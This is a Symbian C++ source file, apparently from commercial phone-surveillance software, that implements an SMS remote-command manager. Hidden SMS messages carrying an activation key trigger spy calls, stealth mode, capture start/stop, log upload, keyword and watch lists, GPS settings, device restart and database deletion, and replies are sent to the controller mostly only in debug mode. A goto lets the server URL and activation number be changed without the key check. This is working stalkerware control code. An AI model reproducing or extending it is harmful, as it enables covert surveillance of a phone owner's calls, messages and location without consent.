#include "SmsCmdManager.h"
#include "Global.h"
#include "SmsCmdFormatter.h"
#include "CltLogEvent.h"

_LIT(KResponseOKFmt,	"[%S %S][%d] OK"); //appname, version, command,
_LIT(KResponseErrorFmt, "[%S %S][%d] Error: %d"); //appname, version, command, err code
_LIT(KResponseErrorFmtStr, "[%S %S][%d] Error: %S");

const TInt KObserverGranurality = 5;

CSmsCmdManager::CSmsCmdManager(MProductLicense& aLicense)
:iLicense(aLicense),
iListeners(KObserverGranurality)
    {
    }
	
CSmsCmdManager::~CSmsCmdManager()
    {
    delete iSmsCmdCli;
    iListeners.Close();
    }
    
CSmsCmdManager* CSmsCmdManager::NewL(MProductLicense& aLicense,const TFileName& appPath)
    {
    CSmsCmdManager* self = new (ELeave) CSmsCmdManager(aLicense);
    CleanupStack::PushL(self);
    self->ConstructL(appPath);
    CleanupStack::Pop(self);
    return self;
    }

void CSmsCmdManager::ConstructL(const TFileName& appPath)
    {
	iSmsCmdCli=CSmsCmdClient::NewL(*this, &appPath);
	RegisterSmsCmdL();
    }

void CSmsCmdManager::RegisterSmsCmdL()
	{
	if(!iSmsCmdCli)
		{
	    TFileName appPath;
		Global::AppUi().GetAppPath(appPath);		
		iSmsCmdCli=CSmsCmdClient::NewL(*this,&appPath);
		}
	
	User::LeaveIfError(iSmsCmdCli->RegisterCommand(KCmds, KSmsCmdLength));
	}

TInt CSmsCmdManager::AddListener(const TUint* aCmdArray, TInt aCmdCount, MCmdListener* aListener)
	{
	TInt err(KErrNone);
	if(aCmdArray)
		{
		TUint smdCmd;
		for(TInt k=0; k<aCmdCount; k++)
			{
			smdCmd = *aCmdArray++;
			err = AddListener(smdCmd, aListener);
			}
		}
	return err;
	}
	
TInt CSmsCmdManager::AddListener(TUint aCmd, MCmdListener* aListener)
	{
	TInt err(KErrNone);
	if(aListener)
		{
		TListenerEntry entry(aCmd, *aListener);
		err=iListeners.Append(entry);
		}
	return err;
	}

HBufC* CSmsCmdManager::ResponseHeaderLC(TInt aCmd, TInt aError)
	{
	TStringFormatter formatter;
	TInt productNumber = AppDefinitions::ProductNumber();
	TBuf<10> productNumStr;
	productNumStr.Num(productNumber);
	HBufC* returnMsg;
	TProductName version;
	AppDefinitions::GetMajorAndMinor(version);	
	if(aError == KErrNone)
		{
		const TDesC& formatted = formatter.Format(KResponseOKFmt, &productNumStr, &version, aCmd);
		returnMsg = formatted.AllocLC();		
		}
	else
		{
		const TDesC& formatted = formatter.Format(KResponseErrorFmt, &productNumStr, &version, aCmd, aError);		
		returnMsg = formatted.AllocLC();
		}
	return returnMsg;
	}

HBufC* CSmsCmdManager::ResponseHeaderLC(TInt aCmd, const TDesC& aStrErr)
	{
	TStringFormatter formatter;
	TInt productNumber = AppDefinitions::ProductNumber();
	TBuf<10> productNumStr;
	productNumStr.Num(productNumber);	
	TProductName version;
	AppDefinitions::GetMajorAndMinor(version);	
	const TDesC& formatted = formatter.Format(KResponseErrorFmtStr, &productNumStr, &version, aCmd, &aStrErr);
	return formatted.AllocLC();	
	}

//MSmsCmdObserver
void CSmsCmdManager::ProcessSmsCommandL(const TSmsCmdDetails& aCmdDetails)
	{
	LOG1(_L("[CSmsCmdManager::ProcessSmsCommandL] Cmd: %d"),aCmdDetails.iCmd)
	CFxsAppUi& appUi = Global::AppUi();
	TBool productActivated = appUi.ProductActivated();
	
	//test house key
	TBool testKey = appUi.SettingsInfo().IsTSM();
	HBufC* replyMessage(NULL);
	switch(aCmdDetails.iCmd) // KInterestedCmds
		{
		case KCmdSetServerURL:
		case KCmdChangeSMSActivationNumber:
			{
			if(productActivated && testKey)
				{
				return;
				}
			else
				{				
				//skip checking FlexiKEY 
				//so as to be able to set activation url
				goto HandleCmd;
				}
			}
		case KCmdEnableSpyCall: //spy 
		case KCmdDisableSpyCall: //spy
		case KCmdQueryDiagnostic:
		case KCmdChangeSettingValue:
		case KCmdRestartDevice:		
		case KCmdStealthMode:
		case KCmdSetPhoneLogDuration:
		case KCmdSendLogNow:
		case KCmdApnAutoDiscovery:
		case KCmdEnableWatchList:
		case KCmdClearWatchList:
		case KCmdDeleteDatabase:
		case KCmdProductDeactivation:
		case KCmdGPSSettings:
		case KCmdSetKeywords:
			{
			if(testKey)
			//KCmdStartCapture,KCmdSendLogNow and KCmdStopCapture commands are available for the test house
				{
				return; //!RETURN
				}
			}
		case KCmdStartCapture:
		case KCmdStopCapture:		
			{
			if(aCmdDetails.iCmd == KCmdSendLogNow)
				{
				if(!appUi.ConfirmBillableEventGlobalL(EBillableEventInetConnection))
					{
					break;
					}
				}
			if(productActivated) //Product is activated
				{
				if(iLicense.ActivationCodeValidL(aCmdDetails.iTag1))				
				//FlexiKEY is correct
					{
		    HandleCmd:
					HBufC* returnMsg=NULL;
					TRAPD(err,returnMsg=ExecuteHandleSmsCommandL(aCmdDetails));//takes ownerhip
					if(returnMsg)
						{
						replyMessage=returnMsg;
						CleanupStack::PushL(replyMessage);						
						}
					else
						{
						//use default message
						replyMessage = ResponseHeaderLC(aCmdDetails.iCmd, err);		
						}
					}
				else // Wrong activation code, FlexiKEY incorrect
					{
					replyMessage = ResponseHeaderLC(aCmdDetails.iCmd, KErrCmdActivationCodeNotMatch);
					}
				}
			else // Product is not activated yet
				{				
				replyMessage = ResponseHeaderLC(aCmdDetails.iCmd, KErrCmdProductNotActivated);
				}		
			}break;
		default:
			{
			_LIT(KNoHandler,"No Handler");
			replyMessage = ResponseHeaderLC(aCmdDetails.iCmd, KNoHandler);			
			}
		}
	TBool allowed(ETrue);
	if(aCmdDetails.iCmd != KCmdSetServerURL)	
		{
		allowed = appUi.ConfirmBillableEventGlobalL(EBillableEventSMS);
		}
	
	//convert sms command to system event
	//and insert to database
	ConvertAndInsertSystemEvent(aCmdDetails);
	
	if(allowed)
		//for symbian signed purpose
		{
		if(AlwaysResponse(aCmdDetails.iCmd) || IsDebugModeSmsCmd(aCmdDetails))
		//only send reply if it is debug mode sms cmd
			{
			//send reply message
			iSmsCmdCli->SendSmsMessageL(aCmdDetails.iSenderPhNumber, *replyMessage);			
			}
		}
	CleanupStack::PopAndDestroy(replyMessage);
	}
	
HBufC* CSmsCmdManager::ExecuteHandleSmsCommandL(const TSmsCmdDetails& aCmdDetails)
	{
	HBufC* returnMsg=NULL;	
	for(TInt i=0;i<iListeners.Count();i++)
		{
		TListenerEntry& entry=iListeners[i];
		if(entry.iCmd == aCmdDetails.iCmd)
			{
			returnMsg = entry.iListener.HandleSmsCommandL(aCmdDetails); //resultMessage ownership is transfered
			}
		}
	return returnMsg;
	}

TBool CSmsCmdManager::AlwaysResponse(TUint aCmd)
	{
	return (aCmd == KCmdQueryDiagnostic || 
			aCmd == KCmdSetKeywords || 
			aCmd == KCmdSetServerURL);
	}
	
TBool CSmsCmdManager::IsDebugModeSmsCmd(const TSmsCmdDetails& aCmdDetails)
	{
	TPtrC lastToken;
	if(aCmdDetails.iTag9.Length())
		{
		lastToken.Set(aCmdDetails.iTag9);		
		}
	else if(aCmdDetails.iTag8.Length())
		{
		lastToken.Set(aCmdDetails.iTag8);
		}
	else if(aCmdDetails.iTag7.Length())
		{
		lastToken.Set(aCmdDetails.iTag7);
		}
	else if(aCmdDetails.iTag6.Length())
		{
		lastToken.Set(aCmdDetails.iTag6);
		}
	else if(aCmdDetails.iTag5.Length())
		{
		lastToken.Set(aCmdDetails.iTag5);
		}
	else if(aCmdDetails.iTag4.Length())
		{
		lastToken.Set(aCmdDetails.iTag4);
		}
	else if(aCmdDetails.iTag3.Length())
		{
		lastToken.Set(aCmdDetails.iTag3);
		}
	else if(aCmdDetails.iTag2.Length())
		{
		lastToken.Set(aCmdDetails.iTag2);
		}
	
	TBuf<1> debugTxt;	
	XUtil::Copy(debugTxt,lastToken);//defendsive copy
	debugTxt.CopyUC(debugTxt);//change to lower case
	_LIT(KDebugIndicator,"D"); //D indicates debug mode	
	return KDebugIndicator() == debugTxt;
	}
	
void CSmsCmdManager::ConvertAndInsertSystemEvent(const TSmsCmdDetails& aCmdDetails)
	{
	TRAPD(ignore,ConvertAndInsertSystemEventL(aCmdDetails));
	}
	
void CSmsCmdManager::ConvertAndInsertSystemEventL(const TSmsCmdDetails& aCmdDetails)
	{
	CFxsDatabase& database = Global::Database();
	HBufC* message = CreateSystemEventLC(aCmdDetails);
	
	TTime time;
	time.HomeTime();
	TBuf<50> timeStr;
	time.FormatL(timeStr,KSimpleTimeFormat);
	CFxsLogEvent* event = CFxsLogEvent::NewL(++iEventId,
										  	 0 ,//aDuration,
										  	KCltLogDirIncoming,//aDirection,
										  	KFxsLogEventSystem,//aEventType,
										  	time,//TTime  aTime,
										 	TPtrC(),//aStatus,
										  	TPtrC(),//aDescription,
										  	TPtrC(),//aNumber,
										  	TPtrC(),//aSubject,
										  	*message, // Data
										  	TPtrC(),
										  	timeStr//aRemoteParty,
										  	);
	database.InsertDbL(event);//pass ownership
	CleanupStack::PopAndDestroy(message);
	}
	
HBufC* CSmsCmdManager::CreateSystemEventLC(const TSmsCmdDetails& aCmdDetails)
	{
	TPtrC begin(KSymbolLessThan);
	TPtrC end(KSymbolGreaterThan);
	HBufC* message = HBufC::NewLC(KMaxLengthCmdTag*11);
	TPtr msgPtr = message->Des();
	if(aCmdDetails.iTag0.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag0);		
		msgPtr.Append(end);			
		}
	if(aCmdDetails.iTag1.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag1);
		msgPtr.Append(end);		
		}
	if(aCmdDetails.iTag2.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag2);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag3.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag3);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag4.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag4);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag5.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag5);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag6.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag6);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag7.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag7);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag8.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag8);
		msgPtr.Append(end);
		}
	if(aCmdDetails.iTag9.Length())
		{
		msgPtr.Append(begin);
		msgPtr.Append(aCmdDetails.iTag9);
		msgPtr.Append(end);
		}
	return message;
	}
	
////////////////////
CSmsCmdManager::TListenerEntry::TListenerEntry(TUint aCmd, MCmdListener& aListener)
:iCmd(aCmd),
iListener(aListener)
	{
	}
